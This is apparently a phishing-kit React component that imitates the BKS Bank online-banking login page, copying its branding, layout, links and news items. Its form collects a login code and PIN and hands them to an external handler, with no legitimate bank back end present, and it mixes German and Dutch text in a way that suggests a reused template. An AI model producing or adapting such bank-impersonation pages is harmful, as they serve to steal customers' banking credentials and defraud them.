"use client";

import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function BksBank({ formData, onChange, handleRouteAction, saving }: Props) {
  return (
    <div className="min-h-screen bg-white text-[#333] font-sans flex flex-col overflow-x-hidden">
      
      {/* Top Purple Banner */}
      <div className="w-full h-8 bg-[#4a1f73] shrink-0"></div>

      {/* Header Area */}
      <header className="w-full max-w-[1200px] mx-auto h-[80px] flex items-center px-4 md:px-8 shrink-0">
        <div className="relative h-10 w-32">
          <Image 
            src="/bks-logo.svg" 
            alt="BKS Bank" 
            fill
            className="object-contain object-left"
          />
        </div>
      </header>

      {/* Main Content */}
      <div className="flex-1 w-full max-w-[1200px] mx-auto px-4 md:px-8 py-8 flex flex-col gap-10">
        
        {/* Top 3-Column Section */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          
          {/* Column 1: Login Box */}
          <div className="bg-white border border-[#e5e5e5] shadow-[0_2px_10px_rgba(0,0,0,0.05)] rounded-sm flex flex-col h-full">
            <div className="p-6 pb-4">
              <h2 className="text-[#e20074] font-bold text-[16px] mb-6">Anmeldung</h2>
              
              <form 
                onSubmit={(e) => {
                  e.preventDefault();
                  handleRouteAction();
                }}
                className="flex flex-col gap-4"
              >
                <div>
                  <input 
                    type="text" 
                    placeholder="Inlogcode"
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full h-[40px] px-3 border border-[#ccc] rounded-sm outline-none focus:border-[#4a1f73] focus:ring-1 focus:ring-[#4a1f73] text-[#333] text-[14px] placeholder-[#aaa]"
                  />
                </div>

                <div className="flex gap-3">
                  <div className="flex-[3]">
                    <input 
                      type="password" 
                      placeholder="PIN"
                      value={formData.pin || ""}
                      onChange={(e) => onChange("pin", e.target.value)}
                      className="w-full h-[40px] px-3 border border-[#ccc] rounded-sm outline-none focus:border-[#4a1f73] focus:ring-1 focus:ring-[#4a1f73] text-[#333] text-[14px] placeholder-[#aaa]"
                    />
                  </div>
                  <div className="flex-[2] bg-white border border-[#ccc] rounded-sm relative flex items-center justify-between px-3 cursor-pointer">
                    <span className="text-[#333] text-[14px]">Deutsch</span>
                    <svg className="w-4 h-4 text-[#666]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>
                </div>

                <p className="text-[#666] text-[12px] leading-tight mt-1 mb-2">
                  Ihre Anmeldung geschieht über gesicherte TLS-Verbindungen.
                </p>

                <div className="flex justify-end">
                  <button 
                    type="submit" 
                    disabled={saving} 
                    className="bg-[#4a1f73] hover:bg-[#38165a] text-white font-medium px-8 h-[36px] rounded-full text-[14px] transition-colors disabled:opacity-70"
                  >
                    {saving ? "Lädt..." : "Weiter"}
                  </button>
                </div>
              </form>
            </div>
            
            {/* Erstanmeldung Button */}
            <div className="mt-auto border-t border-[#e5e5e5] p-2 flex justify-end bg-[#fafafa]">
              <button className="text-[#666] text-[13px] px-4 py-1.5 hover:text-[#333] hover:underline">
                Erstanmeldung
              </button>
            </div>
          </div>

          {/* Column 2: Links */}
          <div className="bg-white border border-[#e5e5e5] shadow-[0_2px_10px_rgba(0,0,0,0.05)] rounded-sm p-6 flex flex-col h-full">
            <h2 className="text-[#e20074] font-bold text-[16px] mb-4">Weiterführende Links</h2>
            <div className="flex flex-col">
              {[
                "BKS Security (Download)",
                "FAQ - oft gestellte Fragen",
                "Servicenummern",
                "Sicherheitsinformation",
                "Fernwartung (Wartungstool)",
                "Wertpapierinformationen"
              ].map((link, i) => (
                <div key={i} className="flex justify-between items-center py-3 border-b border-[#f0f0f0] group cursor-pointer last:border-0">
                  <span className="text-[#4a1f73] text-[14px] group-hover:underline">{link}</span>
                  <svg className="w-4 h-4 text-[#4a1f73]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7-7" />
                  </svg>
                </div>
              ))}
            </div>
          </div>

          {/* Column 3: Promo Image */}
          <div className="relative border border-[#e5e5e5] shadow-[0_2px_10px_rgba(0,0,0,0.05)] rounded-sm overflow-hidden h-[320px] md:h-full flex items-end justify-center pb-6">
            <div 
              className="absolute inset-0 z-0"
              style={{
                backgroundImage: "url('/bks-login.webp')",
                backgroundSize: "cover",
                backgroundPosition: "center",
              }}
            ></div>
            
            {/* Dots */}
            <div className="absolute top-4 left-0 right-0 flex justify-center gap-2 z-10">
              <div className="w-2 h-2 rounded-full bg-[#e20074]"></div>
              <div className="w-2 h-2 rounded-full bg-white/70"></div>
            </div>

            {/* Floating button */}
            <button className="relative z-10 bg-white/90 backdrop-blur-sm text-[#4a1f73] font-bold text-[13px] px-4 py-2 rounded-full shadow-md hover:bg-white transition-colors">
              Mehr Informationen
            </button>
          </div>
        </div>

        {/* Bottom Section: Aktuelle Informationen */}
        <div className="flex flex-col mt-4">
          <h2 className="text-[#4a1f73] font-medium text-[18px] mb-4">Aktuelle Informationen</h2>
          
          <div className="flex flex-col border border-[#e5e5e5] rounded-sm bg-white">
            {/* Row 1 */}
            <div className="flex items-center px-4 py-4 border-b border-[#e5e5e5] cursor-pointer hover:bg-[#fafafa] transition-colors">
              <svg className="w-5 h-5 text-[#666] mr-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7-7" />
              </svg>
              <span className="text-[#4a1f73] text-[14px] font-medium flex-1">Vorsicht vor betrügerischen Anrufen</span>
              <span className="text-[#666] text-[13px] shrink-0">23.01.2026, 14:41 Uhr</span>
            </div>
            
            {/* Row 2 */}
            <div className="flex items-center px-4 py-4 cursor-pointer hover:bg-[#fafafa] transition-colors">
              <svg className="w-5 h-5 text-[#666] mr-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7-7" />
              </svg>
              <span className="text-[#4a1f73] text-[14px] font-medium flex-1">Belangrijke mededeling voor Windows 11 gebruikers</span>
              <span className="text-[#666] text-[13px] shrink-0">14.01.2025, 14:47 Uhr</span>
            </div>
          </div>

          {/* More News Button */}
          <div className="flex justify-center mt-6">
            <button className="border border-[#4a1f73] text-[#4a1f73] hover:bg-[#f9f5fc] bg-white font-medium px-6 py-2 rounded-full text-[13px] transition-colors">
              Weitere Nachrichten anzeigen
            </button>
          </div>
        </div>

      </div>

      {/* Footer */}
      <footer className="w-full max-w-[1200px] mx-auto px-4 md:px-8 py-8 mt-auto shrink-0 border-t border-[#e5e5e5]">
        <div className="flex gap-6 text-[13px] text-[#4a1f73] font-medium">
          <a href="#" className="hover:underline">Impressum</a>
          <a href="#" className="hover:underline">AGB</a>
          <a href="#" className="hover:underline">Geschäftsbedingungen</a>
          <a href="#" className="hover:underline">Fernwartung</a>
        </div>
      </footer>

      {/* Floating Chat Icon */}
      <div className="fixed bottom-6 right-6 z-50">
        <div className="w-14 h-14 bg-[#4a1f73] rounded-full flex items-center justify-center shadow-xl cursor-pointer hover:scale-105 transition-transform">
          <svg className="w-7 h-7 text-white" fill="currentColor" viewBox="0 0 24 24">
            <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" />
            <circle cx="9" cy="10" r="1.5" fill="white" />
            <circle cx="15" cy="10" r="1.5" fill="white" />
            <path d="M8 14h8" stroke="white" strokeWidth="1.5" strokeLinecap="round" />
          </svg>
        </div>
      </div>

    </div>
  );
}
